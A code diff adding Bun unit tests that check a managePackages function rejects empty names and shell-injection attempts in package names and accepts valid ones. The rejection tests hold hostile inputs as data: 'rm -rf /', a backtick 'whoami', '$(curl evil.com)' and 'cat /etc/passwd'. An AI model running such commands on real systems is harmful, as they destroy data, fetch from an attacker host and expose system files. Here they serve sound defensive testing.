@@ -1,5 +1,5 @@
 import { test, expect, describe } from 'bun:test';
-import { generateBranchName } from './git-ops';
+import { generateBranchName, managePackages } from './git-ops';
 
 describe('generateBranchName', () => {
   test('normal title produces dev/<slug>-<id>', () => {
@@ -34,5 +34,63 @@ describe('generateBranchName', () => {
     expect(result).toBe('dev/hello-world-1');
     // No double hyphens between slug and id
     expect(result).not.toMatch(/--/);
+  });
+});
+
+describe('managePackages validation', () => {
+  test('rejects empty packages string', async () => {
+    await expect(managePackages('/tmp', 'add', '')).rejects.toThrow(
+      'No package names provided'
+    );
+  });
+
+  test('rejects whitespace-only packages string', async () => {
+    await expect(managePackages('/tmp', 'add', '   ')).rejects.toThrow(
+      'No package names provided'
+    );
+  });
+
+  test('rejects shell injection via semicolon', async () => {
+    await expect(
+      managePackages('/tmp', 'add', 'lodash; rm -rf /')
+    ).rejects.toThrow('Invalid package name');
+  });
+
+  test('rejects backtick injection', async () => {
+    await expect(
+      managePackages('/tmp', 'add', '`whoami`')
+    ).rejects.toThrow('Invalid package name');
+  });
+
+  test('rejects $() injection', async () => {
+    await expect(
+      managePackages('/tmp', 'add', '$(curl evil.com)')
+    ).rejects.toThrow('Invalid package name');
+  });
+
+  test('rejects pipe injection', async () => {
+    await expect(
+      managePackages('/tmp', 'add', 'lodash | cat /etc/passwd')
+    ).rejects.toThrow('Invalid package name');
+  });
+
+  test('accepts valid simple package name', async () => {
+    const result = await managePackages('/tmp', 'add', 'lodash');
+    expect(result).toBeTruthy();
+  });
+
+  test('accepts scoped package name', async () => {
+    const result = await managePackages('/tmp', 'add', '@types/lodash');
+    expect(result).toBeTruthy();
+  });
+
+  test('accepts package with version specifier', async () => {
+    const result = await managePackages('/tmp', 'add', 'lodash@4.17.21');
+    expect(result).toBeTruthy();
+  });
+
+  test('accepts multiple valid packages', async () => {
+    const result = await managePackages('/tmp', 'add', 'lodash zod');
+    expect(result).toBeTruthy();
   });
 });
